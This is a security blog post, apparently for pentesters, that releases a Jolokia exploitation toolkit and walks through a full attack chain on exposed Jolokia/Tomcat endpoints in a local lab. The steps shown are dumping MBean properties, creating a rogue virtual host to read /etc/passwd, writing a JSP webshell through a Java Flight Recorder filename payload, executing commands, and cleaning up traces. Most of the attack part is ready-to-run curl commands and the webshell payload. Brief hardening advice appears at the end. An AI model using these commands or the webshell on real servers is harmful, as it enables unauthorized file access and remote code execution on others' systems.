<!DOCTYPE html>
<html lang="en">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <script async src="/js/custom.js"></script>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5">
<meta name="generator" content="Hugo 0.57.2" />

    
    
    

<title>Get shells with JET, the Jolokia Exploitation Toolkit • Think
Love
Share</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Get shells with JET, the Jolokia Exploitation Toolkit"/>
<meta name="twitter:description" content="I spent too much time hacking on Jolokia, so here&#39;s an exploitation toolkit, it provides file read, write, rmi injection, information disclosure, and much more. Enjoy!"/>

<meta property="og:title" content="Get shells with JET, the Jolokia Exploitation Toolkit" />
<meta property="og:description" content="I spent too much time hacking on Jolokia, so here&#39;s an exploitation toolkit, it provides file read, write, rmi injection, information disclosure, and much more. Enjoy!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://thinkloveshare.com/hacking/shells_with_jolokia_exploitation_toolkit/" />
<meta property="article:published_time" content="2021-10-29T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-10-29T00:00:00+00:00" />


    


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">




<link rel="stylesheet" href="/css/hyde-hyde.css">
<link rel="stylesheet" href="/css/custom.css">
<link rel="stylesheet" href="/css/print.min.css" media="print">
<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
  crossorigin="anonymous">
</script>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    
</head>


    <body >
        
<div class="sidebar">
  <div class="container sidebar-about ">
      <span class="site__title">
        <a href="https://thinkloveshare.com/">Think
Love
Share</a>
      </span>
          <a href="https://thinkloveshare.com/">
          
          
          
          <div class="author-image">
            <img src="https://thinkloveshare.com/img/laluka.png" alt="Author Image" class="img--circle img--headshot element--center">
          </div>
          
          </a>
      <p class="site__description">
        <a href="https://thinkloveshare.com/">
         InfoSec, Code, Thoughts &amp; Feels 
      </a>
      </p>
    <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/hacking/">
						<span>Hacking</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/coding/">
						<span>Coding</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/the_rest/">
						<span>The Rest</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/travels/">
						<span>Travels</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/about/">
						<span>About</span>
					</a>
				</li>
			 
		
		</li>
	</ul>
</div>

    <p>
      <section class="social">
	
	<a href="https://twitter.com/TheLaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
	
	
	
	<a href="https://github.com/Laluka" rel="me"><i class="rotate fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	
	<a href="https://gitlab.com/TheLaluka" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
	
	
	
	<a href="https://linkedin.com/in/louka-jacques-chevallier-6b2460125" rel="me"><i class="rotate fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
	
	
	
	
	
	
	
	
	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
	
	
  &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
  
	
  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
  
</section>

    </p>
    <p class="copyright">
      &copy; 2021 Laluka.
      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
      <br/>Built with
      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
      
    </p>
  </div>
</div>

        <div class="content container">
            
    <article>
  <header>
    <h1>Get shells with JET, the Jolokia Exploitation Toolkit</h1>
    
    
<div class="post__meta">
    
      <i class="fas fa-calendar-alt"></i> Oct 29, 2021
    
    
    <i class="fas fa-clock"></i> 5 min read
    <i class="fas fa-globe"></i>
    
    Non traduit
    
    <br/> <i class="fas fa-heart"></i>Any typos? Any idea to suggest? Feedback appreciated!<i class="fas fa-heart"></i><br/>
</div>


  </header>
  <hr/>
  <div class="post">
    

<blockquote>
<p>TL;DR: I&rsquo;m finally releasing <a href="https://github.com/laluka/jolokia-exploitation-toolkit">JET</a>, a <a href="https://github.com/laluka/jolokia-exploitation-toolkit">Jolokia Exploitation Toolkit</a>! <br />
To introduct this tool &amp; repo, I&rsquo;ll explain in detail how to get code execution with jolokia and Tomcat/Catalina Mbeans! :)</p>
</blockquote>

<h2 id="oops-i-did-it-again">Oops, I did it again.</h2>

<p><img class="img_full" src="first-time.png" alt="first-time"></p>

<p>I spent too much time on Jolokia, this is a fact. Now, I want you to be able to get shells as well, and I also would like the community to contribute to this project so <code>no jolokia can never ever survive to its pentester again</code>.</p>

<p>If you want to follow along:</p>

<pre><code class="language-bash">docker run --rm -it --net=host --name jolokia bodsch/docker-jolokia
git clone https://github.com/laluka/jolokia-exploitation-toolkit
</code></pre>

<h2 id="step-1-parse-jolokia-list">Step 1: Parse /jolokia/list</h2>

<p>The first thing one should do while fighting a jolokia dragon, is parse its listed MBeans. Luckily (duh), JET got you covered!</p>

<pre><code class="language-bash">python jolokia-parser.py http://127.0.0.1:8080/jolokia | tee jolokia-list.log
</code></pre>

<p><img class="img_full" src="jolokia-parser.png" alt="jolokia-parser"></p>

<h2 id="step-1-1-get-some-information-optional">Step 1.1: Get some information (optional)</h2>

<p>As many properties can be read through jolokia, it&rsquo;s always a good starting point to get information, absolute paths, java versions, sometimes secrets, etc.</p>

<pre><code class="language-bash">cat jolokia-list.log | grep /read/ | wc -l
# 2865 // Almost 3K urls giving juicy info, yum!
mkdir dump &amp;&amp; cd dump
for url in $(cat ../jolokia-list.log | grep /read/); do echo &quot;$url&quot;; curl -skO &quot;$url&quot; ; done
# http://127.0.0.1:8080/jolokia/read/JMImplementation:type=MBeanServerDelegate/ImplementationName
# http://127.0.0.1:8080/jolokia/read/JMImplementation:type=MBeanServerDelegate/MBeanServerId     
# http://127.0.0.1:8080/jolokia/read/JMImplementation:type=MBeanServerDelegate/ImplementationVersion
# http://127.0.0.1:8080/jolokia/read/JMImplementation:type=MBeanServerDelegate/SpecificationVersion
# http://127.0.0.1:8080/jolokia/read/JMImplementation:type=MBeanServerDelegate/SpecificationVendor
# http://127.0.0.1:8080/jolokia/read/JMImplementation:type=MBeanServerDelegate/SpecificationName
# http://127.0.0.1:8080/jolokia/read/JMImplementation:type=MBeanServerDelegate/ImplementationVendor
# http://127.0.0.1:8080/jolokia/read/jdk.management.jfr:type=FlightRecorder/EventTypes
# http://127.0.0.1:8080/jolokia/read/jdk.management.jfr:type=FlightRecorder/Recordings
# http://127.0.0.1:8080/jolokia/read/jdk.management.jfr:type=FlightRecorder/Configurations
# http://127.0.0.1:8080/jolokia/read/jdk.management.jfr:type=FlightRecorder/ObjectName
# http://127.0.0.1:8080/jolokia/read/java.util.logging:type=Logging/LoggerNames 
</code></pre>

<p>Good candidates are the following:</p>

<pre><code class="language-bash">curl -sk 'http://127.0.0.1:8080/jolokia/read/java.lang:type=Runtime/BootClassPath' | jq .
curl -sk 'http://127.0.0.1:8080/jolokia/read/java.lang:type=Runtime/ClassPath' | jq .
curl -sk 'http://127.0.0.1:8080/jolokia/read/java.lang:type=Runtime/InputArguments' | jq .
curl -sk 'http://127.0.0.1:8080/jolokia/read/java.lang:type=Runtime/LibraryPath' | jq .
curl -sk 'http://127.0.0.1:8080/jolokia/read/java.lang:type=Runtime/SystemProperties' | jq .
</code></pre>

<p><img class="img_full" src="properties.png" alt="properties"></p>

<h2 id="step-2-abuse-tomcat-catalina-vhost-features">Step 2: Abuse Tomcat/Catalina Vhost features</h2>

<p>One really cool thing I like about jolokia exploitation, is that many people try to find bugs, or exploit logback, but&hellip; It&rsquo;s like <code>JMX</code>, it has <code>FEATURES</code>, so <code>USE THEM</code>! :)</p>

<p><img class="img_full" src="expose-your-jmx.png" alt="expose-your-jmx"></p>

<blockquote>
<ul>
<li>Side note here. Jolokia <code>is</code> a bridge that allows you to reach <a href="https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/">Mbeans</a> (like JMX features) through HTTP.</li>
<li>They explain in <a href="https://jolokia.org/reference/html/agents.html#agent-war-security">their documentation</a> that jolokia should not be publicly exposed.</li>
<li>No disclosure has been done whatsoever as it&rsquo;s not a bug, it&rsquo;s just <code>feature</code>. They are already doing their part, just read the doc&hellip;</li>
</ul>
</blockquote>

<p>What one can do here is use the Tomcat management MBean to deploy a new vhost, and WOOSH!</p>

<pre><code class="language-bash">grep createStandardHost jolokia-list.log
# http://127.0.0.1:8080/jolokia/exec/Catalina:type=MBeanFactory/createStandardHost/$java.lang.String/$java.lang.String/$java.lang.String/$boolean/$boolean/$boolean/$boolean
curl -skg 'http://127.0.0.1:8080/jolokia/exec/Catalina:type=MBeanFactory/createStandardHost/Catalina:type=Host,host=dummy.com/dummy.com/!//true/true/true/true' | jq .
</code></pre>

<p><img class="img_full" src="deploy-vhost.png" alt="deploy-vhost"></p>

<p>Okay, WTF happened? <br />
We just deployed a new Virtual Host named <code>dummy.com</code>, starting from the root <code>/</code> of the server. <br />
What this really means, is that every 2nd level directory has been deployed on this Vhost. This implies MANY things.</p>

<ul>
<li>We can now read anything!</li>
<li>We can execute jsp already existing everywhere on the server</li>
<li>The vhost is our &ldquo;attacker key&rdquo;. As long as it stays secret, it&rsquo;s not &ldquo;&rdquo;&ldquo;exposed&rdquo;&ldquo;&rdquo;</li>

<li><p>We can reach world writable directories such as <code>/tmp</code> or <code>/dev/shm</code></p>

<pre><code class="language-bash">curl -skg 'http://127.0.0.1:8080/etc/passwd' -H 'Host: dummy.com'
</code></pre></li>
</ul>

<p><img class="img_full" src="file-read.png" alt="file-read"></p>

<p>Scary right? But wait, there&rsquo;s more!!</p>

<h2 id="step-3-file-write-with-java-flight-recorder-jfr">Step 3: File write with Java Flight Recorder (JFR)</h2>

<p>One Mbean that is really often present in the JFR Mbean. It offerts the collection of information about the request processed by the JVM, the JVM itself, the server, etc.</p>

<p>One small quirk is that its extension isn&rsquo;t enforced, so one can trigger a Java Flight Record, and write it as a&hellip; <code>foobar.jsp</code> file. That the JVM will happily process and execute!</p>

<p>But what is in the JFR? How much garbage? Can we control enough content? <br />
Well, this was a long part of the research: How to acquire a reliable file write.</p>

<p>There are probably many ways to achieve this, but the one I found is the following: <br />
Before starting the Flight Record itself, the name of the flight record is stored within the JVM. This implies that it will then be part of the JFR. <br />
Sooooo, if we&rsquo;re able to create a filename.jsp that is as well as webshell, and doesn&rsquo;t contain any <code>/</code> <code>&quot;</code> <code>'</code> or other bad char breaking out attack we&rsquo;re good to go!</p>

<p>Long story short, here&rsquo;s one working payload, it&rsquo;s not the most elegant, but it sure worked many times! :)</p>

<pre><code class="language-bash">PAYLOAD_AND_JSPFILE=$(python2 -c &quot;import sys, urllib as ul; print ul.quote(sys.argv[1])&quot; '&lt;%=Runtime.getRuntime().exec(request.getParameter(String.valueOf(42))).getInputStream()%&gt;.jsp')
echo &quot;$PAYLOAD_AND_JSPFILE&quot;
# %3C%25%3DRuntime.getRuntime%28%29.exec%28request.getParameter%28String.valueOf%2842%29%29%29.getInputStream%28%29%25%3E.jsp
</code></pre>

<p>Then we use our often-present Mbean <code>DiagnosticCommand/jfrStart</code> to write our webshell in <code>/tmp/</code>. <br />
Here, the duration can be adjusted to have a small enough dump so the JVM can compile the jsp (minimize the garbage overhead), but long enough so the filename can be placed in the JFR.</p>

<pre><code class="language-bash">curl -skg 'http://127.0.0.1:8080/jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/'&quot;$PAYLOAD_AND_JSPFILE&quot;',path-to-gc-roots=true,duration=3s'
</code></pre>

<h2 id="step-4-enjoy-our-rce-o">Step 4: Enjoy our RCE \o/</h2>

<pre><code class="language-bash">curl -skg 'http://127.0.0.1:8080/tmp/'&quot;$PAYLOAD_AND_JSPFILE&quot;'?42=curl%20127.0.0.1/rce' -H 'Host: dummy.com'
</code></pre>

<p><img class="img_full" src="rce.png" alt="rce"></p>

<blockquote>
<p>This webshell doesn&rsquo;t print the command output in the response, but the webshell can easily be modified to do so! <br />
Might be cool to make it your first contribution! Right? 🌸</p>
</blockquote>

<h2 id="step-5-clean-yo-shit">Step 5: Clean yo shit!</h2>

<p>This is to me the cutest part. It&rsquo;s dead-simple to clean your mess afterward!</p>

<ol>
<li>Thanks to your shell, you can remove all the files you wrote</li>

<li><p>Thanks to the MBean features, you can stop and destroy <code>your</code> vhost (be <code>very careful</code> here)</p>

<pre><code class="language-bash">python jolokia-parser.py http://127.0.0.1:8080/jolokia | grep -P 'dummy.com.*Host/(stop|destroy)'
# http://127.0.0.1:8080/jolokia/exec/Catalina:host=dummy.com,type=Host/destroy
# http://127.0.0.1:8080/jolokia/exec/Catalina:host=dummy.com,type=Host/stop
curl -skg 'http://127.0.0.1:8080/jolokia/exec/Catalina:host=dummy.com,type=Host/stop'
curl -skg 'http://127.0.0.1:8080/jolokia/exec/Catalina:host=dummy.com,type=Host/destroy'
# And voilà!
</code></pre></li>
</ol>

<p><img class="img_full" src="clean-yo-shit.png" alt="clean-yo-shit"></p>

<h2 id="step-6-bonus">Step 6: Bonus!</h2>

<p>Hey, did you notice? <br />
Every step we went through only uses GET requests! <br />
This means that a single SSRF can be enough to reach and exploit an internal jolokia endpoint!! <br />
This also means that as a dev, you should:</p>

<ul>
<li>Always add authentication</li>
<li>Make sure that no SSRF is present on the application/server</li>
<li>Use it only if you <code>really</code> (<code>really</code> <code>really</code> <code>really</code>) need it</li>
</ul>

<h2 id="last-words">Last words</h2>

<ul>
<li>Use <a href="https://github.com/laluka/jolokia-exploitation-toolkit">JET - Jolokia Exploitation Toolkit</a></li>
<li>This specific exploit is sumed&rsquo;up <a href="https://github.com/laluka/jolokia-exploitation-toolkit/blob/main/exploits/file-write-to-rce-vhost-jfr.md">here</a></li>
<li>Feel free to contribute! There are so many ways to break jolokia, what&rsquo;s yours?</li>
<li>If you used this tool and don&rsquo;t have time to push code but have ideas, come say hi! <a href="https://twitter.com/TheLaluka">@TheLaluka</a></li>
</ul>

<p>If you read that far and are still interested, another exploit (part of <a href="https://github.com/laluka/jolokia-exploitation-toolkit">JET</a>) is explained <a href="https://therealcoiffeur.github.io/c11011">here</a> by a friend <a href="https://twitter.com/Coiffeur0x90">@Coiffeur0x90</a>, have a look! ;)</p>

  </div>
  

<div class="post--navigation post--navigation-single">
    
    <a href="/hacking/failed01_dos_to_rce_in_jolokia/" class="post--navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">Failed01 - DOS to RCE in jolokia</span>
    </a>
    
    
    <a href="/hacking/hacking_guacamole_to_trigger_avocado/" class="post--navigation-next">
      <span class="navigation-tittle">RCE with SSRF and File Write as an exploit chain on Apache Guacamole</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  

  
    


</article>


        </div>
        
    
  
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-128985075-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>



    
        
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        
        <script type="text/javascript">
            hljs.configure({languages: []});
            hljs.initHighlightingOnLoad();
        </script>
        
        



    



    </body>
</html>
